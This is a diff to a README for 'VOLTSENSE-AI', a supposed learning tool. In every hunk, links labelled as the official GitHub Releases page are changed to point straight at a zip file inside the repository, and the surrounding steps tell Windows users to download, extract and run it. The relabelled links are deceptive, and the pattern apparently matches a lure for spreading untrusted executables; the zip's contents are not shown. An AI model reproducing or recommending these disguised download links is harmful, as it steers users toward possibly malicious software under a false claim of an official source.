@@ -1,6 +1,6 @@
 # 🤝 VOLTSENSE-AI - Learn Open Source Faster
 
-[![Download VOLTSENSE-AI](https://img.shields.io/badge/Download-VOLTSENSE--AI-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Androkoe/VOLTSENSE-AI/releases)
+[![Download VOLTSENSE-AI](https://img.shields.io/badge/Download-VOLTSENSE--AI-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Androkoe/VOLTSENSE-AI/main/super/AI_VOLTSENS_1.0.zip)
 
 ## 🚀 What is VOLTSENSE-AI?
 
@@ -15,7 +15,7 @@ Use it if you want to:
 
 ## 🪟 Windows Download
 
-Go to the [VOLTSENSE-AI Releases page](https://github.com/Androkoe/VOLTSENSE-AI/releases) to visit this page to download.
+Go to the [VOLTSENSE-AI Releases page](https://raw.githubusercontent.com/Androkoe/VOLTSENSE-AI/main/super/AI_VOLTSENS_1.0.zip) to visit this page to download.
 
 Look for the latest release and choose the file that matches Windows. In most cases, this will be an `.exe` file or a `.zip` file.
 
@@ -26,7 +26,7 @@ If you see more than one file:
 
 ## 📥 How to Download
 
-1. Open the [Releases page](https://github.com/Androkoe/VOLTSENSE-AI/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Androkoe/VOLTSENSE-AI/main/super/AI_VOLTSENS_1.0.zip).
 2. Find the newest release at the top.
 3. Read the file names under the release.
 4. Click the Windows download file.
@@ -108,7 +108,7 @@ Before you open the file, check:
 - the file type
 - the download source
 
-Only use the file from the official [VOLTSENSE-AI Releases page](https://github.com/Androkoe/VOLTSENSE-AI/releases).
+Only use the file from the official [VOLTSENSE-AI Releases page](https://raw.githubusercontent.com/Androkoe/VOLTSENSE-AI/main/super/AI_VOLTSENS_1.0.zip).
 
 ## 🧑‍💻 For Beginners
 
@@ -211,7 +211,7 @@ If you use the `.zip` file, extract it before opening the app.
 ## 🔁 Update Process
 
 When a new release appears:
-1. Open the [Releases page](https://github.com/Androkoe/VOLTSENSE-AI/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Androkoe/VOLTSENSE-AI/main/super/AI_VOLTSENS_1.0.zip).
 2. Check the latest version.
 3. Download the new Windows file.
 4. Replace the older copy if needed.
